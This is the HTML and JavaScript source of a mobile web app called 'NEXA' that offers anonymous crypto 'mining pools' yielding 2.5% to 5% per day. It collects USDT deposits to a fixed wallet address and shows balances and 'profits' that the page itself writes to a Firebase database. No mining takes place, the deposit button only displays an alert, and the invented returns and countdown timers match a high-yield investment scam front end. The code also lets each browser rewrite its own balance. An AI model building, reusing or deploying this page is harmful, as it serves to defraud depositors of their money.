<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA | Anonymous Node</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; color: #0f172a; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass-panel { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(20px); border-radius: 28px; border: 1px solid rgba(255,255,255,0.3); }
        .card-elite { background: linear-gradient(135deg, #0062ff 0%, #001c48 100%); color: white; border-radius: 35px; box-shadow: 0 25px 50px -12px rgba(0, 82, 209, 0.4); position: relative; overflow: hidden; }
        .progress-fill { transition: width 1s linear; height: 100%; border-radius: 100px; }
        .timer-badge { background: rgba(0, 102, 255, 0.1); color: #0066ff; padding: 4px 12px; border-radius: 100px; font-size: 10px; font-weight: 800; border: 1px solid rgba(0, 102, 255, 0.2); }
        .hidden { display: none; }
        .nexa-input { background: #f1f5f9; border-radius: 20px; padding: 18px; width: 100%; outline: none; border: 2px solid transparent; transition: 0.3s; font-weight: 700; font-size: 14px; text-align: center; }
        .nexa-input:focus { border-color: #0066ff; background: white; }
    </style>
</head>
<body class="pb-24">

    <!-- 1. ANONYMOUS AUTH MODULE -->
    <div id="auth-module" class="fixed inset-0 bg-white z-[50000] flex flex-col items-center justify-center p-10">
        <div class="w-20 h-20 bg-blue-600 rounded-[28px] flex items-center justify-center text-white text-3xl mb-10 shadow-2xl rotate-6 animate-bounce">
            <i class="fa-solid fa-ghost"></i>
        </div>
        <div class="w-full max-w-xs text-center animate__animated animate__fadeIn">
            <h2 class="text-4xl font-black italic tracking-tighter mb-2">NEXA NODE</h2>
            <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[3px] mb-10">Instant Anonymous Access</p>
            
            <div class="space-y-4">
                <input type="text" id="anon-name" placeholder="Enter Nickname Sweetie" class="nexa-input mb-4">
                <button onclick="loginAnonymously()" class="w-full bg-slate-900 text-white p-5 rounded-2xl font-black uppercase text-xs tracking-widest shadow-2xl hover:bg-blue-600 transition-all">
                    Initialize Session <i class="fa-solid fa-bolt-lightning ml-2"></i>
                </button>
            </div>
            <p class="mt-8 text-[9px] font-bold text-slate-300 uppercase leading-relaxed">No Email. No Password.<br>Your account is tied to this device.</p>
        </div>
    </div>

    <!-- 2. MAIN APP CONTENT -->
    <div id="app-content" class="hidden">
        <div class="max-w-md mx-auto px-6 pt-8">
            
            <!-- Dynamic Header -->
            <header class="flex justify-between items-center mb-10">
                <div class="flex items-center gap-4">
                    <div class="w-14 h-14 bg-slate-100 rounded-[20px] flex items-center justify-center text-blue-600 text-xl shadow-inner border-2 border-white">
                        <i class="fa-solid fa-mask"></i>
                    </div>
                    <div>
                        <p id="greeting-msg" class="text-[10px] font-black uppercase text-slate-400">Welcome Sweetie</p>
                        <h2 id="display-username" class="text-2xl font-black italic tracking-tighter">Anonymous</h2>
                    </div>
                </div>
                <button onclick="logout()" class="w-12 h-12 glass-panel flex items-center justify-center text-red-500 shadow-sm"><i class="fa-solid fa-power-off"></i></button>
            </header>

            <!-- Page: Home -->
            <div id="page-home" class="page-view animate__animated animate__fadeIn">
                <div class="card-elite p-8 mb-10">
                    <p class="text-[10px] font-black opacity-60 uppercase tracking-[2px] mb-2">Anonymous Liquidity</p>
                    <h2 id="user-bal" class="text-6xl font-black tracking-tighter mb-8">$0.00</h2>
                    <div class="grid grid-cols-2 gap-4">
                        <button onclick="showPage('deposit')" class="bg-white text-blue-600 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest shadow-xl">Deposit</button>
                        <button onclick="showPage('history')" class="bg-white/10 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest backdrop-blur-md">Logs</button>
                    </div>
                </div>

                <!-- Active Nodes -->
                <h3 class="text-xs font-black uppercase tracking-[3px] text-slate-400 mb-6 flex items-center gap-2">
                    <i class="fa-solid fa-microchip text-blue-500 animate-pulse"></i> Active Nodes
                </h3>
                <div id="active-nodes-container" class="space-y-4 mb-10"></div>

                <!-- Plans -->
                <h3 class="text-xs font-black uppercase tracking-[3px] text-slate-400 mb-6">Mining Pools</h3>
                <div class="space-y-4" id="plans-container">
                    <div class="glass-panel p-6 bg-white flex justify-between items-center shadow-sm">
                        <div class="flex items-center gap-5">
                            <div class="w-14 h-14 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-xl shadow-inner"><i class="fa-solid fa-server"></i></div>
                            <div>
                                <p class="text-lg font-black italic">Starter Alpha</p>
                                <p class="text-[10px] font-black text-green-500 uppercase">Yield: 2.5% / 24h</p>
                            </div>
                        </div>
                        <button onclick="buyPlan('Starter Alpha', 20, 2.5)" class="bg-slate-900 text-white px-5 py-3 rounded-xl text-[10px] font-black uppercase italic shadow-lg">Stake $20</button>
                    </div>

                    <div class="glass-panel p-6 bg-slate-900 text-white flex justify-between items-center border-none shadow-xl">
                        <div class="flex items-center gap-5">
                            <div class="w-14 h-14 bg-white/10 text-blue-400 rounded-2xl flex items-center justify-center text-xl backdrop-blur-xl"><i class="fa-solid fa-bolt"></i></div>
                            <div>
                                <p class="text-lg font-black italic">Pro Quantum</p>
                                <p class="text-[10px] font-black text-blue-400 uppercase">Yield: 5.0% / 24h</p>
                            </div>
                        </div>
                        <button onclick="buyPlan('Pro Quantum', 100, 5.0)" class="bg-blue-600 text-white px-5 py-3 rounded-xl text-[10px] font-black uppercase italic shadow-lg shadow-blue-500/30">Stake $100</button>
                    </div>
                </div>
            </div>

            <!-- Page: History -->
            <div id="page-history" class="page-view hidden animate__animated animate__fadeIn">
                <div class="flex items-center gap-4 mb-8">
                    <button onclick="showPage('home')" class="w-12 h-12 glass-panel flex items-center justify-center text-slate-800"><i class="fa-solid fa-arrow-left"></i></button>
                    <h2 class="text-2xl font-black italic">Session History</h2>
                </div>
                <div id="history-list" class="space-y-4"></div>
            </div>

            <!-- Page: Deposit -->
            <div id="page-deposit" class="page-view hidden animate__animated animate__fadeIn">
                <div class="flex items-center gap-4 mb-8">
                    <button onclick="showPage('home')" class="w-12 h-12 glass-panel flex items-center justify-center"><i class="fa-solid fa-arrow-left"></i></button>
                    <h2 class="text-2xl font-black italic">Top-Up</h2>
                </div>
                <div class="glass-panel p-8 text-center bg-white shadow-xl">
                    <p class="text-[10px] font-black text-slate-400 mb-2 uppercase tracking-widest">USDT (BEP20) Address</p>
                    <div class="bg-slate-100 p-5 rounded-2xl break-all font-black text-[11px] text-slate-600 mb-8 border-2 border-dashed border-slate-200">
                        0x71C7656EC7ab88b098defB751B7401B5f6d8976F
                    </div>
                    <button onclick="alert('Sent to Admin sweetie!')" class="w-full bg-blue-600 text-white p-5 rounded-2xl font-black uppercase text-xs tracking-widest shadow-xl">Confirm Deposit</button>
                </div>
            </div>

        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, update, push, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAuth, signInAnonymously, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);

        // -- Anonymous Login Logic --
        window.loginAnonymously = async () => {
            const name = document.getElementById('anon-name').value || "Guest_" + Math.floor(Math.random()*999);
            try {
                const res = await signInAnonymously(auth);
                // Check if user exists in DB, if not create
                const snap = await get(ref(db, `users/${res.user.uid}`));
                if(!snap.exists()) {
                    await set(ref(db, `users/${res.user.uid}`), { username: name, balance: 0, type: 'anonymous', joined: Date.now() });
                }
            } catch (err) { alert(err.message); }
        };

        window.logout = () => signOut(auth).then(() => location.reload());

        // -- System Core --
        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('auth-module').classList.add('hidden');
                document.getElementById('app-content').classList.remove('hidden');
                initSystem(user.uid);
            } else {
                document.getElementById('auth-module').classList.remove('hidden');
            }
        });

        function initSystem(uid) {
            onValue(ref(db, `users/${uid}`), s => {
                if(s.exists()){
                    const d = s.val();
                    document.getElementById('user-bal').innerText = `$${d.balance.toFixed(2)}`;
                    document.getElementById('display-username').innerText = d.username;
                }
            });
            setInterval(() => syncMining(uid), 1000);
            loadLogs(uid);
        }

        window.showPage = (id) => {
            document.querySelectorAll('.page-view').forEach(p => p.classList.add('hidden'));
            document.getElementById(`page-${id}`).classList.remove('hidden');
        };

        window.buyPlan = async (name, price, roi) => {
            const uid = auth.currentUser.uid;
            const snap = await get(ref(db, `users/${uid}`));
            const bal = snap.val().balance;

            if(bal < price) return showPage('deposit');

            if(confirm(`Activate ${name} sweetie?`)) {
                const now = Date.now();
                await update(ref(db, `users/${uid}`), { balance: bal - price });
                await push(ref(db, `active_plans/${uid}`), {
                    planName: name, invested: price, profit: (price * roi / 100).toFixed(2),
                    start: now, expiry: now + (24 * 60 * 60 * 1000)
                });
                await push(ref(db, `history/${uid}`), { type: 'Invest', plan: name, amount: price, date: new Date().toLocaleDateString() });
            }
        };

        function syncMining(uid) {
            onValue(ref(db, `active_plans/${uid}`), (snap) => {
                const container = document.getElementById('active-nodes-container');
                if(!snap.exists()) return container.innerHTML = `<p class='text-center py-6 text-slate-300 font-bold uppercase text-[9px]'>Node standby...</p>`;
                
                let html = "";
                snap.forEach(child => {
                    const p = child.val();
                    const left = p.expiry - Date.now();
                    if(left > 0) {
                        const h = Math.floor(left / 3600000);
                        const m = Math.floor((left % 3600000) / 60000);
                        const s = Math.floor((left % 60000) / 1000);
                        const prog = ((Date.now() - p.start) / (p.expiry - p.start)) * 100;
                        html += `
                        <div class="glass-panel p-6 bg-white shadow-sm border-l-4 border-blue-600 mb-4 animate__animated animate__fadeIn">
                            <div class="flex justify-between items-center mb-4"><span class="text-[10px] font-black uppercase text-blue-600">${p.planName}</span><span class="timer-badge">${h}h ${m}m ${s}s</span></div>
                            <div class="w-full h-1 bg-slate-100 rounded-full overflow-hidden"><div class="h-full bg-blue-600 progress-fill" style="width:${prog}%"></div></div>
                        </div>`;
                    } else { finalize(uid, child.key, p); }
                });
                container.innerHTML = html;
            }, { onlyOnce: true });
        }

        async function finalize(uid, key, p) {
            const userSnap = await get(ref(db, `users/${uid}`));
            const newBal = userSnap.val().balance + parseFloat(p.profit) + parseFloat(p.invested);
            await update(ref(db, `users/${uid}`), { balance: newBal });
            await remove(ref(db, `active_plans/${uid}/${key}`));
            await push(ref(db, `history/${uid}`), { type: 'Profit', plan: p.planName, amount: p.profit, date: new Date().toLocaleDateString() });
        }

        function loadLogs(uid) {
            onValue(ref(db, `history/${uid}`), s => {
                const list = document.getElementById('history-list');
                list.innerHTML = "";
                if(!s.exists()) return;
                Object.values(s.val()).reverse().forEach(h => {
                    const isP = h.type === 'Profit';
                    list.innerHTML += `
                    <div class="glass-panel p-5 flex justify-between items-center bg-white">
                        <div><p class="text-[10px] font-black uppercase">${h.type}</p><p class="text-[9px] font-bold text-slate-400">${h.plan}</p></div>
                        <p class="font-black ${isP ? 'text-green-600' : 'text-slate-800'}">${isP ? '+' : '-'}$${h.amount}</p>
                    </div>`;
                });
            });
        }
    </script>
</body>
</html>
